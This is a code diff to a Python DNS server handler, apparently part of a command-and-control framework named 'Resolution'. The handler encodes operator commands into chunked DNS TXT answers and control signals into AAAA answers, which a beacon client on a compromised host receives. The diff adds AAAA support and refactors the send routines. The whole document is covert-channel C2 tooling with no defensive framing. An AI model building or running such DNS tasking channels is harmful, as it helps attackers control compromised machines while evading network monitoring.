@@ -1,4 +1,4 @@
-from dnslib import DNSRecord, QTYPE, TXT, DNSError, RR, CLASS
+from dnslib import DNSRecord, QTYPE, TXT, AAAA, DNSError, RR, CLASS
 from backend.handlers.protocolhandler import ProtocolHandler
 from util.structs import CommandType, Command
 from enum import Enum
@@ -8,7 +8,8 @@ import logging
 
 class Records(Enum):
     """ The types of records the DNSHandler can currently encode """
-    TXT = (QTYPE.TXT, TXT)
+    TXT = (QTYPE.TXT, TXT, 253)
+    AAAA = (QTYPE.AAAA, AAAA, 16)
 
 class Domains(Enum):
     """ The valid subdomains used as function indicators by Resolution """
@@ -115,48 +116,78 @@ class DNSHandler(ProtocolHandler):
             self.logger.debug(f"[{self.ip}] respond: DNS Packet Malformed: {str(e)}")
         return 2
 
-    def _send_command(self, request: DNSRecord, port: int, command: Command):
+    def _send_command(self, record: DNSRecord, port: int, command: str):
         """
-        A helper function used to send command packets to the Resolution client
-        This currenty only works with TXT records
+        Send control packets to the client
         """
-        #opcode = command.type
-        cmd = command.command
-        # get the type of record this beacon is ready to receive
-        rr_type, rr_constructor = self.record_type.value
-        # Generate skeleton question for packet
-        command_packet = request.reply()
-        # chunk the responses in 255 byte values in accordance with RFC
-        chunks = [f"1:{cmd[i:i+253]}" for i in range(0, len(cmd), 253)] 
-        for chunk in chunks:
-            self.logger.debug(chunk)
-            answer = RR(
-                    rname=request.get_q().get_qname(),
+
+        def TXT(rr_type, packet):
+            cmd = command.command
+            _, constructor, msg_size = Records.TXT.value
+            chunks = [f"1:{cmd[i:i+msg_size]}" for i in range(0, len(cmd), msg_size)] 
+            for chunk in chunks:
+                answer = RR(
+                        rname=record.get_q().get_qname(),
+                        rtype=rr_type,
+                        rclass=CLASS.IN,
+                        rdata=constructor(chunk),
+                        ttl=1337)
+                packet.add_answer(answer)
+
+        def AAAA(rr_type, packet):
+            _, rr_constructor, _ = Records.AAAA.value
+            packet.add_answer(
+                RR(rname=record.get_q().get_qname(),
                     rtype=rr_type,
                     rclass=CLASS.IN,
-                    rdata=rr_constructor(chunk),
-                    ttl=1337)
-            command_packet.add_answer(answer)
-        # send command
-        self.socket.sendto(command_packet.pack(), (self.ip, port))
-        self.logger.info(f"{self.ip}: {cmd} Sent")
+                    rdata=rr_constructor([1 for x in range(16)]),
+                    ttl=1337))
 
-
-    def _send_control(self, request: DNSRecord, port: int, control: str):
-        """
-        A helper function used to send control packets to the Resolution client.
-        """
-        # get the type of record this beacon is ready to receive
-        rr_type, rr_constructor = self.record_type.value
+        rr_type = record.questions[0].qtype
         # Generate skeleton question for packet
-        command_packet = request.reply()
-        # Generate the response to the question
-        command_packet.add_answer(
-            RR(
-                rname=request.get_q().get_qname(),
+        command_packet = record.reply()
+        if rr_type == 16:
+            TXT(rr_type, command_packet)
+        elif rr_type == 28:
+            AAAA(rr_type, command_packet)
+        else:
+            self.logger.debug("send_command: invalid record")
+            pass
+
+        # Reply
+        self.socket.sendto(command_packet.pack(), (self.ip, port))
+
+    def _send_control(self, record: DNSRecord, port: int, control: str):
+        """
+        Send control packets to the client
+        """
+
+        def TXT(rr_type):
+            _, rr_constructor, _ = Records.TXT.value
+            return RR(rname=record.get_q().get_qname(),
                 rtype=rr_type,
                 rclass=CLASS.IN,
                 rdata=rr_constructor(f"1:{control}"),
-                ttl=1337))
-        # send command
+                ttl=1337)
+
+        def AAAA(rr_type):
+            _, rr_constructor, _ = Records.AAAA.value
+            return RR(rname=record.get_q().get_qname(),
+                rtype=rr_type,
+                rclass=CLASS.IN,
+                rdata=rr_constructor([1 for x in range(16)]),
+                ttl=1337)
+
+        rr_type = record.questions[0].qtype
+        # Generate skeleton question for packet
+        command_packet = record.reply()
+        if rr_type == 16:
+            command_packet.add_answer(TXT(rr_type))
+        elif rr_type == 28:
+            command_packet.add_answer(AAAA(rr_type))
+        else:
+            self.logger.debug("send_control: invalid record")
+            pass
+
+        # Reply
         self.socket.sendto(command_packet.pack(), (self.ip, port))
